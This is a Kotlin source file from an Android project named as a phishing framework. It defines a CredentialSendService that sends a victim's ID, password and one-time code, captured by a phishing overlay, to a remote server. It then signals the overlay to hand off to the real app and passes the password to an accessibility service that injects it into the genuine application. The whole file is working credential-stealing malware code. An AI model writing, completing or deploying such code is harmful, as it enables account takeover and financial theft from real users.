package com.example.phishingframework.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import com.example.phishingframework.models.Credentials
import com.example.phishingframework.network.NetworkManager
import com.example.phishingframework.utils.Constants
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch

class CredentialSendService : Service() {

    companion object {
        private const val TAG = "CredentialSendService"
    }

    // Allows running credential sending asynchronously and cleanly
    private val serviceJob = Job()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val idNumber = intent?.getStringExtra("id") ?: run {
            Log.e(TAG, "ID is missing from intent")
            stopSelf()
            return START_NOT_STICKY
        }

        val password = intent.getStringExtra("password") ?: run {
            Log.e(TAG, "Password is missing from intent")
            stopSelf()
            return START_NOT_STICKY
        }

        val codeValue = intent.getStringExtra("code") ?: ""

        val credentials = Credentials(
            id = idNumber,
            password = password,
            code = codeValue
        )

        serviceScope.launch {
            sendCredentials(credentials)
        }

        // We'll stop the service ourselves after completion
        return START_NOT_STICKY
    }

    private fun sendCredentials(credentials: Credentials) {
        Log.d(TAG, "Sending credentials for ID: ${credentials.id}")

        NetworkManager.sendCredentials(
            credentials = credentials,
            onSuccess = {
                Log.i(TAG, "Credentials sent successfully")

                // 1. Send Broadcast message that sending succeeded
                // Who receives? PhishingOverlayActivity with resultReceiver
                // Result: opens real application and closes overlay
                sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_OK))

                // 2. Broadcast with password to AccessibilityService
                // Who receives? PhishingAccessibilityService with injectorReceiver
                // Result: saves password for automatic injection into real application
                sendBroadcast(Intent(Constants.ACTION_INJECT_PASSWORD).apply {
                    putExtra("password", credentials.password)
                })
                // Stop service
                stopSelf()
            },
            onFailure = { exception ->
                Log.e(TAG, "Failed to send credentials", exception)
                sendBroadcast(Intent(Constants.ACTION_CREDENTIALS_FAILED))
                stopSelf()
            }
        )
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
        Log.d(TAG, "Service destroyed")
    }
}